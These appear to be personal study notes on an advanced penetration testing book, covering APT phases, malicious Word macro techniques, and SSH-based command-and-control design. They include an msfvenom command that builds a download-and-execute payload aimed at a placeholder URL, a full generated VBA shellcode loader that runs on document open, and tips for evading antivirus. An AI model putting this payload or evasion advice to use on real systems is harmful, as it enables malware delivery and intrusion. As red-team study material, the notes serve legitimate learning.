# Advanced Penetration Testing

## Introduction

> “When your organization experiences a serious security incident (and it will),
> it's your level of preparedness based on the understanding of the
> inevitability of such an event that will guide a successful recovery.”

> “What differentiates an APT from a more traditional intrusion is that it is
> strongly goal-oriented. The attacker is looking for something (proprietary
> data for example) and is prepared to be as patient as is necessary to acquire
> it.”

Phases of an APT:

1. Initial compromise
    - usually has a technical and a social aspect i.e. a technical flaw combined
      with a good social pretext to help exploit it.
    - examples
        - MS word runs VBA script which is potentially insecure (technical
          flaw) + creating a social situtation where a user will enable Macros
          on a word doc and run your malicious code (social engineering aspect)
1. Establish beachhead
    - Ensure access to the compromised assets without having to repeat the
      intial compromise (i.e. setup C2 infrastructure)
    - Once this is done, the attacker's activity will not appear in many audit
      logs e.g. login activity
1. Escalate privileges
    - Get local admin privileges
    - Get domain admin privileges if possible
1. Internal reconnisance
    - Collect info on
        - surrounding network infrastructure (what's out there?)
        - trust relationships (who trusts the compromised host?)
        - Windows domain structure
1. Network colonization (lateral movement)
    - Exploit other hosts from the initial compromised host
1. Persist
    - Make sure C2 continues to work across reboots
1. Complete mission
    - exfiltrate stolen data

APT actors

- have a good understanding of how existing security products work and how to
  avoid them
- capable of creating their own tools to avoid these products (customised tool
  for each target seems totally workable given enough budget)

He thinks

> I want to show how conventional penetration testing is next to useless when
> attempting to protect organizations against a targeted APT attack. Only by
> going beyond the stagnant nature of contemporary penetration testing
> methodologies can this hope to be achieved.

Explain?

Charactersitcs of good C2

- its traffic looks legit
- its traffic should be secure

SSH traffic fits all of these requirements on most networks

Misconceptions about APT

1. I will see elevated logins at strange times and from strange places
    - Once the intial compromise has happened the attacker will not uses
      _audited_ login routes anymore - they will have their own C2
      infrastructure which will completely bypass standard login to the system
1. Finding widespread backdoor trojans
    - A less experienced attacker may use these but APT won't rely on on
      off-the-shelf backdoor trojans so these may be decoys
1. Unexpected information flows
    - The attacker will access all other hosts from the compromised host so you
      might not notice strange IPs accessing your important resources
1. Unexpected data bundles lying around
    - Only if they are super sloppy
1. Detecting "pass-the-hash" hacking tools
    - _pass the hash_:
        - exploits a weakness in the authentication protocol where the hash
          remains the same between sessions (until the password is changed)
        - attacker finds the hash of a credential but not the plaintext. If
          other services/hosts allow you to send that hash then it can be used
          as effectively as the plaintext credential.
    - common against NTLM authentication
    - Only visible if attacker is sloppy

END INTRODUCTION

## Chapter 1

- APT Threat Modelling is a branch of pen testing
    - attacks focus on end users to achieve initial compromise (rather than on
      vulnerable Internet facing infrastructure)
    - can be
        - preventative: part of a pen testing exercise (most common)
            - can be short-term (fulltime over a few weeks) or long-term (1hr
              per day over months)
                - long-term engagements can be foiled by clients wanting regular
                  updates which lets them fix holes mid-engagement
        - postmortem: part of a post incident forensics report to indicate how
          the intruder could have gained access

### Aside Malicious VBA payloads

There are many options for creating a malicious VBA

1. Option: Have VBA script create a thread directly and move the shellcode into
   the memory of that thread
    - -- You call functions `VirtualAlloc`, `RtlMoveMemory`, `CreateThread` and
      AV will flag it almost every time
1. Option: Have the VBA script write a VBS script to disk and then shell out to
   run it (aka create a VBA/VBS "dual stager")
    - ++ The VBA looks more benign as it just shells out to run `wscript` binary
      which has legit uses
    - VBS is a general purpose scripting language (like python, ruby etc) and is
      often used for legitmate purposes so cannot be automatically locked down
      as much

Author tips

- Author recommends doing code obfucation (e.g. XOR) but not pulling in a third
  party lib to do it as AV scanners will likely pick it up.
- Author recommends not running your code on document open becuase it looks
  suspicious to AV scanners. Instead create a button which the user will click
  to run the code (this makes it harder to spot by AV)

Other techniques

- main VBA can be clean but store the malicious content in forms within the
  document which the main VBA reads and writes its payload to disk
- MS Word has different file format for documents without macros (docx) and with
  macros (docm)
- In general, MS Word opens files based on the file data, not based on the file
  name extension. So long as MS Word can identify the data structure, it will
  open the file correctly. This means you can rename .docx files to .rtf and
  word will open it just fine.
- renaming a `.docm` to `.docx` will prevent it from opening (which is a good
  thing)

#### Aside: msfvenom

Metasploit will create a VBA snippet for you that encodes binary of your choice
as a decimal encoded shellcode `msfvenom`. It is functional but basic and will
be caught by many AV scanners because it encodes the payload directly in the VBA
code (as decimal shellcode)

```bash
$ ls
hello  hello.c
$ msfvenom -p windows/download_exec -f vba -e x86/shikata_ga_nai -i 5 -a x86 --platform Windows EXE=~/hello URL=http://www.blah.com > output.vbs
```

Contents of output.vbs:

```vbs
#If Vba7 Then
	Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Zgudvwh As Long, ByVal Vxpmqwy As Long, ByVal Urrjowm As LongPtr, Ykjkcx As Long, ByVal Gdklw As Long, Qyxngl As Long) As LongPtr
	Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Lslpj As Long, ByVal Xqm As Long, ByVal Yfbbr As Long, ByVal Bqjofnv As Long) As LongPtr
	Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Gocnqictp As LongPtr, ByRef Rnutsjvsr As Any, ByVal Dnquy As Long) As LongPtr
#Else
	Private Declare Function CreateThread Lib "kernel32" (ByVal Zgudvwh As Long, ByVal Vxpmqwy As Long, ByVal Urrjowm As Long, Ykjkcx As Long, ByVal Gdklw As Long, Qyxngl As Long) As Long
	Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Lslpj As Long, ByVal Xqm As Long, ByVal Yfbbr As Long, ByVal Bqjofnv As Long) As Long
	Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Gocnqictp As Long, ByRef Rnutsjvsr As Any, ByVal Dnquy As Long) As Long
#EndIf

Sub Auto_Open()
	Dim Ljcndgm As Long, Omagfa As Variant, Nunfzfwl As Long
#If Vba7 Then
	Dim  Kjpjr As LongPtr, Jnjbycok As LongPtr
#Else
	Dim  Kjpjr As Long, Jnjbycok As Long
#EndIf
	Omagfa = Array(177,159,144,111,219,220,217,116,36,244,91,41,201,177,135,49,67,21,3,67,21,131,235,252,226,68,66,81,213,131,161,225,37,18,45,34,206,249,231,227,159,128,201,166,200,129,124,94,116,77,94,49,128,132,140,154,110,111,198,241,114,122,118,48,45,66,208,55,28,225,119,199,189,54,187,82,41,160,143,253, _
5,173,52,252,31,148,197,162,202,133,232,12,84,209,36,62,40,98,178,21,114,122,94,124,144,245,82,131,82,161,80,13,199,135,207,251,235,116,140,174,13,250,31,246,42,247,250,81,171,38,67,175,150,173,68,156,106,37,142,17,165,183,222,170,50,124,207,93,0,202,96,214,249,244,101,31,189,168,243,13, _
134,49,154,177,42,179,75,35,208,125,222,5,148,246,146,122,55,250,86,119,165,143,80,112,80,4,26,168,76,73,173,166,135,42,159,173,90,42,31,170,201,147,99,242,128,228,210,182,201,243,43,248,20,50,245,45,20,20,2,193,101,136,178,40,194,132,32,203,50,1,58,175,76,216,235,1,49,128,189,116, _
240,254,12,101,151,2,151,60,95,207,36,69,59,240,169,165,161,160,121,15,33,78,40,127,69,136,221,57,90,59,205,41,16,188,173,48,109,165,212,145,43,169,211,31,104,61,1,32,60,134,211,148,140,142,43,131,69,119,24,210,101,10,14,228,182,251,12,73,22,246,128,181,182,223,224,97,244,251,139,125, _
169,55,119,83,8,227,64,144,233,217,124,30,153,192,42,220,19,147,83,254,108,159,164,235,175,253,225,241,174,48,30,169,3,132,32,155,225,89,78,182,123,69,174,123,169,107,30,74,50,215,173,47,64,56,165,76,121,13,194,115,150,168,137,78,20,183,147,91,132,56,152,229,85,149,118,18,175,193,123,105, _
98,185,37,87,12,220,206,118,169,50,83,137,73,6,164,132,75,199,27,114,238,61,0,156,112,86,234,36,125,252,72,195,72,251,185,13,148,229,133,18,189,29,210,182,251,150,44,110,94,7,71,176,247,15,101,57,235,121,67,13,228,7,80,247,104,248,6,75,80,234,17,140,109,248,98,109,198,149,170,173, _
23,104,166,91,211,133,18,126,101,169,209,21,250,137,13,198,180,215,251,72,84,55,135,135,249,241,121,240,1,38,141,138,150,145,216,231,71,230,32,126,218,54,55,76,15,134,14,11,81,192,95,200,180,208,32,199,76,249,159,117,174,61,201,130,66,228,229,237,245,179,173,253,172,25,250,106,193,199,136,36, _
131,147,217,234,174)

	Kjpjr = VirtualAlloc(0, UBound(Omagfa), &H1000, &H40)
	For Nunfzfwl = LBound(Omagfa) To UBound(Omagfa)
		Ljcndgm = Omagfa(Nunfzfwl)
		Jnjbycok = RtlMoveMemory(Kjpjr + Nunfzfwl, Ljcndgm, 1)
	Next Nunfzfwl
	Jnjbycok = CreateThread(0, 0, Kjpjr, 0, 0, 0)
End Sub
Sub AutoOpen()
	Auto_Open
End Sub
Sub Workbook_Open()
	Auto_Open
End Sub
```

#### Aside: shikata-na-gai encoder

- a _polymorphic XOR additive feedback encoder_
- links
    - https://www.rapid7.com/db/modules/encoder/x86/shikata_ga_nai
    - https://github.com/rapid7/metasploit-framework/blob/master/modules/encoders/x86/shikata_ga_nai.rb
- generates different output on each run
- the output can only be recognised by actually running the code in a VM or
  sandbox

### Charactersitcs of a good C2

1. Egress connectivity
    - The client must be able to initiate connections back to the C2 server
    - needs to do this in a way to minimize firewall interference
1. Stealth - avoid detection by host IDS or network IDS
1. Remote filesystem access
    - be able to copy files to/from the compromised system
1. Remote command execution on the compromised system
1. Secure communications
    - traffic between C2 client and server should be encrypted to prevent
      responders from seeing what actions have been taken
1. Persistence
    - C2 client must be able to survive reboots
1. Port forwarding
    - We want to be able to redirect traffic bi-directionally via the
      compromised host
1. Control thread
    - Ensure that connection to the C2 server is re-established in the event of
      reboot or network connectivity problem

The author recommends SSH protocol to satisfy all the above and in particular
statically linking `libssh` into your payload (`libssh` is cross platform and
has some niceities e.g. a control thread)

C2 Server

- run it on port 443 - it is probably open on the firewall and encrypted traffic
  on it is not unusual
- modify the ssh-server config to allow "remotely forwarded tunnels" ???
- chroot jail to contain the ssh server
    - why?

C2 client (aka the payload of the initial compromise)

- starts an SSH server listening on a non-standard port
- has an SSH client which can connect to the C2 ssh server
- implements ssh tunnels (both local and dynamic ???) over the ssh client
    - allows the C2 server access to the filesystem and processes - how???
